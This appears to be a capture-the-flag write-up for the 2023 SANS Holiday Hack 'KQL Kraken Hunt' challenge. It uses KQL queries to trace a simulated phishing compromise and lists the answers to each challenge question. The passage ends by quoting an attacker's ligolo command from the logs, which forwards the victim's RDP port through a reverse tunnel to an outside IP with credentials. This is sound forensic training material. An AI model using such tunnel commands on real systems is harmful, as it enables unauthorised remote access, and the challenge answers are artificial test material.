# Writeup for The 2023 SANS Holiday Hack Challenge: A Holiday Odyssey \| Featuring 6: Geese A-Lei'ing!
## KQL Kraken Hunt
Difficulty: :christmas_tree::christmas_tree:  
Use Azure Data Explorer to [uncover misdeeds](https://detective.kusto.io/sans2023) in Santa's IT enterprise. Go to Film Noir Island and talk to Tangle Coalbox for more information.

### Hints
#### Outbound Connections
*From: Tangle Coalbox*
Do you need to find something that happened via a process? Pay attention to the ProcessEvents table!
#### KQL Tutorial
*From: Tangle Coalbox*
Once you get into the [Kusto trainer](https://detective.kusto.io/sans2023), click the blue Train me for the case button to get familiar with KQL.
#### File Creation
*From: Tangle Coalbox*
Looking for a file that was created on a victim system? Don't forget the FileCreationEvents table.

### Solution
#### Onboarding
*Question*: How many Craftperson Elf's are working from laptops? 

*Query*:
```kql
Employees 
| where role == "Craftsperson Elf" and hostname contains "LAPTOP"
| summarize count()
```

*Answer*: `25`

#### Case #1
*Question*: 
1) What is the email address of the employee who received this phishing email?
2) What is the email address that was used to send this spear phishing email?
3) What was the subject line used in the spear phishing email?

*Query*:
```kql
Email
| where link contains "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
| project recipient, sender, subject
```

*Answer*: 
| recipient | sender | subject |
| ------------------------------------------------ | ------------------ | -------------------------------- |
| alabaster_snowball@santaworkshopgeeseislands.org | cwombley@gmail.com | \[EXTERNAL\] Invoice foir reindeer food past due |

#### Case #2
*Question*: 
1) What is the role of our victim in the organization?
2) What is the hostname of the victim's machine?
3) What is the source IP linked to the victim?

*Query*:
```kql
Employees
| where email_addr == "alabaster_snowball@santaworkshopgeeseislands.org"
| project role, hostname, ip_addr
```

*Answer*: 
| role     | hostname     | ip_addr   | 
| -------- | ------------ | --------- |
| Head Elf | Y1US-DESKTOP | 10.10.0.4 |

#### Case #3
*Question*: 
1) What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!
2) What file is dropped to Alabaster's machine shortly after he downloads the malicious file?

*Query for question 1*:
```kql
OutboundNetworkEvents
| where src_ip == "10.10.0.4" and url contains "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
| project timestamp
```

*Answer for question 1*: `2023-12-02T10:12:42Z`

*Query for question 2*:
```kql
FileCreationEvents
| where hostname == "Y1US-DESKTOP" and timestamp > datetime("2023-12-02T10:12:42Z") and filename != "MonthlyInvoiceForReindeerFood.docx"
| limit 1
| project filename
```

*Answer for question 2*: `giftwrap.exe`

#### Case #4
*Question*: 
1) The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?
2) What is the timestamp when the attackers enumerated network shares on the machine?
3) What was the hostname of the system the attacker moved laterally to?

*Query*:
```kql
ProcessEvents
| where hostname == "Y1US-DESKTOP" and timestamp > datetime("2023-12-02T10:12:42Z")
```

*Answer for question 1*:   
This took a little manual analysis, eventually identifying the command:
```bash
cmd.exe "ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
```